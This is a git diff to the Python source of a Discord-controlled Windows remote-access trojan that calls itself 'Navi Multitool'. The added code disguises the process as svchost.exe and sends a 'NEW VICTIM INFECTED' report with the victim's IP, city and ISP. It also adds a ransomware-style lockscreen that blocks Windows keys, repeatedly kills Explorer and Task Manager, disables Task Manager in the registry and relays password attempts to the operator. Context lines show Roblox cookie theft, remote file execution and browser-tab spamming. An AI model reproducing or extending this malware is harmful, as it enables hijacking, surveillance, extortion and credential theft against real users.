@@ -18,11 +18,13 @@ import urllib.request
 import shutil
 from zipfile import ZipFile
 from ctypes import *
-
+import ctypes.wintypes
+import socket
 import tempfile
 import requests
 from requests import get
-
+import tkinter as tk
+from PIL import Image, ImageTk
 import discord
 from discord.ext import commands
 from discord import utils
@@ -30,6 +32,7 @@ from discord import utils
 from comtypes import CLSCTX_ALL
 import comtypes
 
+from io import BytesIO
 
 import win32gui
 from win32 import win32gui
@@ -38,6 +41,7 @@ from win32con import SW_HIDE
 import win32process
 import win32net
 import win32com.client as wincl
+from win32crypt import CryptUnprotectData
 
 import pyautogui
 import browserhistory as bh
@@ -59,6 +63,69 @@ def navi_embed(text, color=0x00aaff, thumbnail=True):
         embed.set_thumbnail(url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
     embed.set_footer(text="Navi Multitool • https://github.com/glockinhand/navi-multitool", icon_url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
     return embed
+
+def hide_script():
+    import ctypes
+    from ctypes import wintypes, byref
+    kernel32 = ctypes.windll.kernel32
+    ntdll   = ctypes.windll.ntdll
+    current = kernel32.GetCurrentProcess()
+    class PROCESS_BASIC_INFORMATION(ctypes.Structure):
+        _fields_ = [
+            ('ExitStatus', wintypes.LONG),
+            ('PebBaseAddress', ctypes.c_void_p),
+            ('AffinityMask', ctypes.c_void_p),
+            ('BasePriority', wintypes.LONG),
+            ('UniqueProcessId', ctypes.c_void_p),
+            ('InheritedFromUniqueProcessId', ctypes.c_void_p),
+        ]
+
+    pbi = PROCESS_BASIC_INFORMATION()
+    status = ntdll.NtQueryInformationProcess(
+        current, 0, byref(pbi), ctypes.sizeof(pbi), None
+    )
+    if status != 0:
+        return False
+    is_64bit = ctypes.sizeof(ctypes.c_void_p) == 8
+    peb_offset = 0x20 if is_64bit else 0x10
+
+    buffer = ctypes.create_string_buffer(8)
+    bytes_read = wintypes.SIZE_T()
+    kernel32.ReadProcessMemory(
+        current,
+        ctypes.c_void_p(pbi.PebBaseAddress + peb_offset),
+        buffer,
+        8,
+        byref(bytes_read)
+    )
+
+    proc_params = ctypes.c_void_p()
+    ctypes.memmove(byref(proc_params), buffer, ctypes.sizeof(proc_params))
+    str_offset = 0x60 if is_64bit else 0x38
+    str_buffer = ctypes.create_string_buffer(16)
+    kernel32.ReadProcessMemory(
+        current,
+        ctypes.c_void_p(proc_params.value + str_offset),
+        str_buffer,
+        16,
+        byref(bytes_read)
+    )
+
+    buf_ptr = ctypes.c_void_p()
+    ctypes.memmove(byref(buf_ptr), str_buffer[4:4+ctypes.sizeof(ctypes.c_void_p)], ctypes.sizeof(ctypes.c_void_p))
+
+    target = "svchost.exe\0"
+    target_bytes = target.encode('utf-16-le')
+    kernel32.WriteProcessMemory(
+        current,
+        buf_ptr,
+        ctypes.c_char_p(target_bytes),
+        len(target_bytes),
+        byref(wintypes.SIZE_T())
+    )
+    return True
+
+hide_script()
 
 def hide_and_persist():
     try:
@@ -146,7 +213,6 @@ def get_roblox_sex():
                 if encoded_cookies:
                     decoded_cookies = base64.b64decode(encoded_cookies)
                     try:
-                        from win32crypt import CryptUnprotectData
                         decrypted_bytes = CryptUnprotectData(decoded_cookies, None, None, None, 0)[1]
                         decrypted_cookie = decrypted_bytes.decode('utf-8', errors='ignore')
                     except Exception as e:
@@ -173,6 +239,8 @@ def get_roblox_sex():
     if not info:
         return None, "Token is invalid or Roblox API returned an error."
     return info, token
+
+
 
 class DiscordMod:
     def __init__(self):
@@ -298,48 +366,320 @@ class DiscordMod:
         except Exception as e:
             self._log(f"Discord Token Error: {e}")
 
+bot_loop = None
+bot_ready = False
+_pending = []
+_pending_lock = threading.Lock()
+log_channel_id = 0 
+
 @bot.event
 async def on_ready():
+    global bot_loop, bot_ready
     global number
-    number = 0
     global channel_name
-    channel_name = None
-    on_ready.total = []
+    bot_ready = True
+    bot_loop = asyncio.get_running_loop()
+    bot.loop.create_task(_background_sender())
+    existing_sessions = []
     for x in bot.get_all_channels():
-        on_ready.total.append(x.name)
-    for y in range(len(on_ready.total)):
-        if "session" in on_ready.total[y]:
-            result = [e for e in re.split("[-9]", on_ready.total[y]) if e != '']
-            numbers = [int(x) for x in result if str(x).isdigit()]
-            biggest = max(numbers)
-            
-    if number == 0:
-        channel_name = "session-1"
-        newchannel = await bot.guilds[0].create_text_channel(channel_name)
+        if x.name.startswith("session-"):
+            try:
+                num = int(x.name.split("-")[1])
+                existing_sessions.append(num)
+            except (ValueError, IndexError):
+                pass    
+    if existing_sessions:
+        number = max(existing_sessions) + 1
     else:
-        channel_name = f"session-{number}"
-        newchannel = await bot.guilds[0].create_text_channel(channel_name)
-    channel_ = discord.utils.get(bot.get_all_channels(), name=channel_name)
-    channel = bot.get_channel(channel_.id)
+        number = 1
+    channel_name = f"session-{number}"
+    if not bot.guilds:
+        return
+    newchannel = await bot.guilds[0].create_text_channel(channel_name)
+    channel = newchannel
     is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
-    import requests
-
-    data = requests.get("https://ipinfo.io/json").json()
-
-    ip = data.get("ip", "Unknown")
-    flag = data.get("country", "US")
-    
-    embed = discord.Embed(title="NAVI • !help for commands", color=0x00ff00)
-    embed.add_field(name="Session ID", value=f"`{channel_name}`", inline=True)
-    embed.add_field(name="Infected User", value=f"`{os.getlogin()}`", inline=True)
-    embed.add_field(name="Operating System", value=f"`{platform.system()} {platform.release()}`", inline=False)
-    embed.add_field(name="Network Address", value=f"`{ip}` :flag_{flag.lower()}:", inline=True)
+    privileges = "Administrator 🛡️" if is_admin else "Standard User 👤"
+    try:
+        data = requests.get("https://ipinfo.io/json").json()
+        ip = data.get("ip", "Unknown")
+        flag = data.get("country", "US")
+        city = data.get("city", "Unknown")
+        region = data.get("region", "Unknown")
+        isp = data.get("org", "Unknown")
+    except Exception:
+        ip = "Unknown"
+        flag = "US"
+        city = "Unknown"
+        region = "Unknown"
+        isp = "Unknown"
+    embed = discord.Embed(
+        title="NEW VICTIM INFECTED",
+        description="*A new control session has been successfully initialized. `!help` for all commands.*",
+        color=0x00aaff
+    )
+    embed.add_field(
+        name="📡 Session Details",
+        value=f"**Channel:** <#{newchannel.id}>\n**Privileges:** `{privileges}`",
+        inline=False
+    )
+    embed.add_field(
+        name="💻 Host Information",
+        value=f"**User:** `{os.getlogin()}`\n**Operating System:** `{platform.system()} {platform.release()}`",
+        inline=False
+    )
+    embed.add_field(
+        name="🌐 Network Connection",
+        value=f"**IP:** `{ip}` :flag_{flag.lower()}:\n**Location:** `{city}, {region}`\n**ISP:** `{isp}`",
+        inline=False
+    )
     embed.set_thumbnail(url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
-    embed.set_footer(text="Navi Multitool • github.com/glockinhand/navi-multitool", icon_url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png")
-    
+    embed.set_footer(
+        text="Navi Multitool • github.com/glockinhand/navi-multitool",
+        icon_url="https://i.ibb.co/kg532m6B/avatars-000615381687-t475ap-t240x240-removebg-preview.png"
+    )
     await channel.send(content="@here", embed=embed)
-    game = discord.Game(f"Window logging stopped")
+    game = discord.Game("Window logging stopped")
     await bot.change_presence(status=discord.Status.online, activity=game)
+
+
+
+log_channel_id = 0
+RANSOM_PW = "N4vi_0n_T0p"
+IMAGE_URL = "https://i.ibb.co/KpxXhQhm/image.png"
+HOSTNAME = socket.gethostname()
+locker_window = None
+_killer_stop = threading.Event()
+log_channel = None
+_bot_ready = threading.Event()
+_bot_loop = None
+WH_KEYBOARD_LL = 13
+WM_KEYDOWN = 0x0100
+VK_LWIN = 0x5B
+VK_RWIN = 0x5C
+
+@bot.command(name="ransomware")
+async def set_log_channel(ctx):
+    global log_channel_id
+    log_channel_id = ctx.channel.id
+    await ctx.send("**Setting things up...**")
+    time.sleep(1)
+    await ctx.send(f"**Done! Type !lock to deploy the ransomware..**\nPassword to unlock is: `{RANSOM_PW}`")
+
+async def _background_sender():
+    global log_channel_id
+    await bot.wait_until_ready()
+    while True:
+        try:
+            channel = None
+            if log_channel_id:
+                channel = bot.get_channel(log_channel_id)
+            msgs = []
+            with _pending_lock:
+                while _pending:
+                    msgs.append(_pending.pop(0))
+            if channel and msgs:
+                for m in msgs:
+                    try:
+                        await channel.send(m)
+                    except Exception as e:
+                        print(f"[BOT] Send failed: {e}")
+        except Exception as e:
+            print(f"[BOT] Background error: {e}")
+        await asyncio.sleep(0.5)
+
+def send_discord_message(content):
+    with _pending_lock:
+        _pending.append(content)
+
+if ctypes.sizeof(ctypes.c_void_p) == 8:
+    WPARAM = ctypes.c_uint64
+    LPARAM = ctypes.c_int64
+else:
+    WPARAM = ctypes.c_uint32
+    LPARAM = ctypes.c_int32
+
+LowLevelKeyboardProc = ctypes.WINFUNCTYPE(
+    ctypes.c_long, ctypes.c_int, WPARAM, LPARAM
+)
+
+class KBDLLHOOKSTRUCT(ctypes.Structure):
+    _fields_ = [
+        ("vkCode", ctypes.wintypes.DWORD),
+        ("scanCode", ctypes.wintypes.DWORD),
+        ("flags", ctypes.wintypes.DWORD),
+        ("time", ctypes.wintypes.DWORD),
+        ("dwExtraInfo", ctypes.POINTER(ctypes.c_ulong)),
+    ]
+
+_hook_proc_callback = None
+hook_handle = None
+
+def _hook_proc(nCode, wParam, lParam):
+    if nCode >= 0 and wParam == WM_KEYDOWN:
+        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
+        if kb.vkCode in (VK_LWIN, VK_RWIN):
+            return 1
+    return ctypes.windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
+
+def install_keyblock():
+    global hook_handle, _hook_proc_callback
+    if hook_handle:
+        return
+    if _hook_proc_callback is None:
+        _hook_proc_callback = LowLevelKeyboardProc(_hook_proc)
+    user32 = ctypes.windll.user32
+    user32.SetWindowsHookExW.argtypes = [
+        ctypes.c_int, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32
+    ]
+    user32.SetWindowsHookExW.restype = ctypes.c_void_p
+    callback_ptr = ctypes.cast(_hook_proc_callback, ctypes.c_void_p)
+    hook_handle = user32.SetWindowsHookExW(WH_KEYBOARD_LL, callback_ptr, 0, 0)
+    if not hook_handle:
+        print("[!] Failed to install keyboard hook.")
+
+def uninstall_keyblock():
+    global hook_handle
+    if hook_handle:
+        ctypes.windll.user32.UnhookWindowsHookEx(hook_handle)
+        hook_handle = None
+
+def kill_process(procname):
+    subprocess.run(["taskkill", "/f", "/im", procname],
+                   capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+
+def poll_killer():
+    while not _killer_stop.is_set():
+        try:
+            kill_process("explorer.exe")
+            kill_process("taskmgr.exe")
+        except Exception:
+            pass
+        _killer_stop.wait(0.5)
+
+def disable_taskmgr_registry():
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                             r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
+                             0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
+        winreg.CloseKey(key)
+    except Exception:
+        pass
+
+def cleanup_lockdown():
+    _killer_stop.set()
+    uninstall_keyblock()
+    try:
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                             r"Software\Microsoft\Windows\CurrentVersion\Policies\System",
+                             0, winreg.KEY_SET_VALUE)
+        winreg.DeleteValue(key, "DisableTaskMgr")
+        winreg.CloseKey(key)
+    except (FileNotFoundError, OSError):
+        pass
+    time.sleep(0.3)
+    subprocess.Popen("explorer.exe", creationflags=subprocess.CREATE_NO_WINDOW)
+
+class LockscreenGUI:
+    def __init__(self, root, image_url=IMAGE_URL):
+        self.root = root
+        self.wrong_attempts = 0
+        self.root.attributes("-fullscreen", True, "-topmost", True)
+        self.root.overrideredirect(True)
+
+        install_keyblock()
+        disable_taskmgr_registry()
+
+        _killer_stop.clear()
+        killer = threading.Thread(target=poll_killer, daemon=True)
+        killer.start()
+
+        kill_process("explorer.exe")
+
+        self.root.bind("<Alt-F4>", self._block)
+        self.root.bind("<Escape>", self._block)
+        self.root.bind("<F11>", self._block)
+        self.root.bind("<Alt-space>", self._block)
+
+        self.root.lift()
+        self.root.focus_force()
+
+        try:
+            resp = requests.get(image_url, timeout=10)
+            resp.raise_for_status()
+            raw = Image.open(BytesIO(resp.content))
+            if raw.mode != "RGBA":
+                raw = raw.convert("RGBA")
+            bg = Image.new("RGBA", raw.size, (10, 10, 10, 255))
+            img = Image.alpha_composite(bg, raw).convert("RGB")
+        except Exception:
+            img = Image.new("RGB", (root.winfo_screenwidth(), root.winfo_screenheight()), (10, 10, 10))
+
+        img = img.resize((root.winfo_screenwidth(), root.winfo_screenheight()), Image.LANCZOS)
+        self.bg_tk = ImageTk.PhotoImage(img)
+
+        canvas = tk.Canvas(root, highlightthickness=0, bg="black")
+        canvas.pack(fill="both", expand=True)
+        canvas.create_image(0, 0, image=self.bg_tk, anchor="nw")
+
+        self.entry = tk.Entry(root, font=("Courier", 20), show="*", justify="center",
+                              bg="black", fg="#00ff00", insertbackground="#00ff00",
+                              insertwidth=2, relief="flat")
+        canvas.create_window(root.winfo_screenwidth() // 2,
+                             int(root.winfo_screenheight() * 0.88),
+                             window=self.entry, width=350)
+        self.root.bind("<Return>", self.check_pw)
+        self.entry.focus_set()
+
+        send_discord_message(":lock: **Ransomware activated**")
+
+    def _block(self, event):
+        return "break"
+
+    def check_pw(self, e=None):
+        global locker_window
+        pw_entered = self.entry.get()
+        if pw_entered == RANSOM_PW:
+            send_discord_message(
+                f":unlock: **Ransomware unlocked** – correct password entered "
+                f"(after {self.wrong_attempts} failed attempt(s))"
+            )
+            cleanup_lockdown()
+            self.root.destroy()
+            locker_window = None
+        else:
+            self.wrong_attempts += 1
+            send_discord_message(
+                f":no_entry: **Wrong password attempt #{self.wrong_attempts}**: `{pw_entered}`"
+            )
+            self.entry.delete(0, tk.END)
+
+def run_gui():
+    global locker_window
+    if not locker_window:
+        locker_window = tk.Tk()
+        app = LockscreenGUI(locker_window)
+        locker_window.mainloop()
+
+@bot.command()
+async def lock(ctx, target="all"):
+    if target.lower() in ["all", HOSTNAME.lower()]:
+        await ctx.send(f"🔒 Deploying ransomware on `{HOSTNAME}`...")
+        threading.Thread(target=run_gui, daemon=True).start()
+
+@bot.command()
+async def unlock(ctx, target="all"):
+    global locker_window
+    if target.lower() in ["all", HOSTNAME.lower()]:
+        if locker_window:
+            try:
+                locker_window.after(0, locker_window.destroy)
+                locker_window = None
+                await ctx.send(f"🔓 **[SUCCESS]** `{HOSTNAME}` has been remotely unlocked and GUI process terminated.")
+            except Exception as e:
+                await ctx.send(f"⚠️ **[ERROR]** Failed to unlock `{HOSTNAME}`: {str(e)}")
+        else:
+            await ctx.send(f"ℹ️ `{HOSTNAME}` is not currently in a locked state.")
 
 def volumeup():
     os.system("powershell -c (New-Object -ComObject WScript.Shell).SendKeys([char]175)")
@@ -430,17 +770,19 @@ def get_embed(page: str):
             "`!blockinput / !unblockinput` – Block I/O 🔑\n"
             "`!hidedesktop` – Toggle desktop icons\n"
             "`!disabletaskmgr / !enabletaskmgr` – Task manager 🔑\n"
+            "`!spam_site <url>` - Spam 100 website tabs"
         )
 
     elif page == "destructive":
         e.description = (
             "☠️ **Destructive**\n\n"
-            "`!shutdown <sec>`\n"
-            "`!restart`\n"
-            "`!logoff`\n"
-            "`!critproc` 🔑\n"
-            "`!uncritproc` 🔑\n"
-            "`!bsod` 🔑"
+            "`!shutdown <sec>` – Turn off PC\n"
+            "`!restart` - Restart PC\n"
+            "`!logoff` – Log victim off\n"
+            "`!ransomware` – Lock screen and deploy ransomware\n"
+            "`!critproc` – Make a process critical (crash on stop) 🔑\n"
+            "`!uncritproc` – Remove critproc 🔑\n"
+            "`!bsod` – Blue screen of death 🔑"
         )
 
     elif page == "session":
@@ -491,6 +833,32 @@ class HelpView(discord.ui.View):
 async def help(ctx):
     await ctx.send(embed=get_embed("main"), view=HelpView())
 
+@bot.command(brief="Spams opening a website in the victim's browser.")
+async def spam_site(ctx, url: str, amount: int = 100):
+    try:
+        if not url.startswith(("http://", "https://")):
+            url = "https://" + url
+
+        await ctx.send(f"Spamming {url} ({amount} browser opens)...")
+
+        def do_spam():
+            for _ in range(amount):
+                try:
+                    subprocess.Popen(
+                        f'start "" "{url}"',
+                        shell=True,
+                        creationflags=subprocess.CREATE_NO_WINDOW
+                    )
+                    time.sleep(0.05)
+                except:
+                    pass
+
+        threading.Thread(target=do_spam, daemon=True).start()
+
+    except Exception as e:
+        await ctx.send(f"Error spamming site: {str(e)}")
+
+
 EXEC_MAP = {
     ".py":   (sys.executable,       False, None),
     ".bat":  (["cmd.exe", "/c"],     True,  None),
@@ -519,8 +887,10 @@ def run_with_fallback(cmd, use_shell, cwd, hide_window=True):
         stderr=subprocess.DEVNULL,
         creationflags=flags
     )
+
     time.sleep(0.5)
     ret = proc.poll()
+
     if ret is not None and hide_window:
         if ret == 0:
             return proc, None
@@ -540,9 +910,10 @@ def run_with_fallback(cmd, use_shell, cwd, hide_window=True):
             return proc, None
         else:
             return proc, f"Process exited with code {ret}"
+
     return proc, None
 
-@bot.command(name="execute")
+@bot.command(name="execut")
 async def upload_and_run(ctx: commands.Context):
     if not ctx.message.attachments:
         await ctx.send("Navi needs a file attached.")
